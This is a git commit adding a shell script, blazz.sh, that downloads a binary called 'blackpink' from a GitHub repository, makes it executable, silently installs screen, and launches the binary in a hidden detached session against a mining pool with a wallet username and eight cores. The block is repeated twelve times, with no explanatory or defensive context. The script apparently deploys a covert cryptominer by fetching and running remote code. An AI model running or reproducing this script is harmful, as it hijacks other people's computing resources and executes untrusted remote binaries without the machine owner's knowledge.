a41499f48db99c0481ecbce3beac13619748b3a3
obisumila <obisumila@gmail.com>
2024-09-23 10:48:49 +0800

    Add files via upload

---
+++ blazz.sh
@@ -0,0 +1,119 @@
+wget https://github.com/obisumila/literate-spoon/raw/refs/heads/main/blackpink ;
+chmod +x blackpink ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S null -dm ./blackpink --url null://tw-pool.com:5487/mine mine --username WroYUZaJjVAG9bBBoCxXj53nXkAqa6urDHtZEKd83ja.BLAZZ --cores 8 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
+wget https://github.com/obisumila/literate-spoon/raw/refs/heads/main/blackpink ;
+chmod +x blackpink ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S null -dm ./blackpink --url null://tw-pool.com:5487/mine mine --username WroYUZaJjVAG9bBBoCxXj53nXkAqa6urDHtZEKd83ja.BLAZZ --cores 8 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
+wget https://github.com/obisumila/literate-spoon/raw/refs/heads/main/blackpink ;
+chmod +x blackpink ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S null -dm ./blackpink --url null://tw-pool.com:5487/mine mine --username WroYUZaJjVAG9bBBoCxXj53nXkAqa6urDHtZEKd83ja.BLAZZ --cores 8 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
+wget https://github.com/obisumila/literate-spoon/raw/refs/heads/main/blackpink ;
+chmod +x blackpink ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S null -dm ./blackpink --url null://tw-pool.com:5487/mine mine --username WroYUZaJjVAG9bBBoCxXj53nXkAqa6urDHtZEKd83ja.BLAZZ --cores 8 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
+wget https://github.com/obisumila/literate-spoon/raw/refs/heads/main/blackpink ;
+chmod +x blackpink ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S null -dm ./blackpink --url null://tw-pool.com:5487/mine mine --username WroYUZaJjVAG9bBBoCxXj53nXkAqa6urDHtZEKd83ja.BLAZZ --cores 8 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
+wget https://github.com/obisumila/literate-spoon/raw/refs/heads/main/blackpink ;
+chmod +x blackpink ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S null -dm ./blackpink --url null://tw-pool.com:5487/mine mine --username WroYUZaJjVAG9bBBoCxXj53nXkAqa6urDHtZEKd83ja.BLAZZ --cores 8 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
+wget https://github.com/obisumila/literate-spoon/raw/refs/heads/main/blackpink ;
+chmod +x blackpink ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S null -dm ./blackpink --url null://tw-pool.com:5487/mine mine --username WroYUZaJjVAG9bBBoCxXj53nXkAqa6urDHtZEKd83ja.BLAZZ --cores 8 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
+wget https://github.com/obisumila/literate-spoon/raw/refs/heads/main/blackpink ;
+chmod +x blackpink ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S null -dm ./blackpink --url null://tw-pool.com:5487/mine mine --username WroYUZaJjVAG9bBBoCxXj53nXkAqa6urDHtZEKd83ja.BLAZZ --cores 8 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
+wget https://github.com/obisumila/literate-spoon/raw/refs/heads/main/blackpink ;
+chmod +x blackpink ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S null -dm ./blackpink --url null://tw-pool.com:5487/mine mine --username WroYUZaJjVAG9bBBoCxXj53nXkAqa6urDHtZEKd83ja.BLAZZ --cores 8 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
+wget https://github.com/obisumila/literate-spoon/raw/refs/heads/main/blackpink ;
+chmod +x blackpink ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S null -dm ./blackpink --url null://tw-pool.com:5487/mine mine --username WroYUZaJjVAG9bBBoCxXj53nXkAqa6urDHtZEKd83ja.BLAZZ --cores 8 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
+wget https://github.com/obisumila/literate-spoon/raw/refs/heads/main/blackpink ;
+chmod +x blackpink ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S null -dm ./blackpink --url null://tw-pool.com:5487/mine mine --username WroYUZaJjVAG9bBBoCxXj53nXkAqa6urDHtZEKd83ja.BLAZZ --cores 8 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
+wget https://github.com/obisumila/literate-spoon/raw/refs/heads/main/blackpink ;
+chmod +x blackpink ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S null -dm ./blackpink --url null://tw-pool.com:5487/mine mine --username WroYUZaJjVAG9bBBoCxXj53nXkAqa6urDHtZEKd83ja.BLAZZ --cores 8 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
